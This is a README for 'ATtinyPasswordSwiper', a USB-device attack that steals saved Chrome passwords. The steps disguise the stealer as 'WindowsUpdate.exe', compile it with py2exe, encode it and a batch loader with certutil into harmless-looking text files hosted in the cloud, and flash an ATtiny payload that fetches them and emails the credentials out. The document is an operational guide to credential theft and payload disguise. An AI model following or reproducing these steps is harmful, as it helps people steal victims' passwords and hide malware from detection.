# ATtinyPasswordSwiper

 Uses chromepass.py https://github.com/hassaanaliw/chromepass
 
 1. Update WindowsUpdate.py with valid email credentials.
 2. Use py2exe to compile into exe file (since most Windows PCs don't come with Python).
 3. In command prompt run: certutil -encode WindowsUpdate.exe "certification.txt"
 4. Upload certification.txt to cloud and replace link in orion.bat
 5. In command prompt run: certutil -encode orion.bat "emerald.txt"
 6. Upload emerald.txt to cloud and replace link in payload.ino
 7. Compile and upload payload.ino to ATtiny Device using Arduino IDE
 
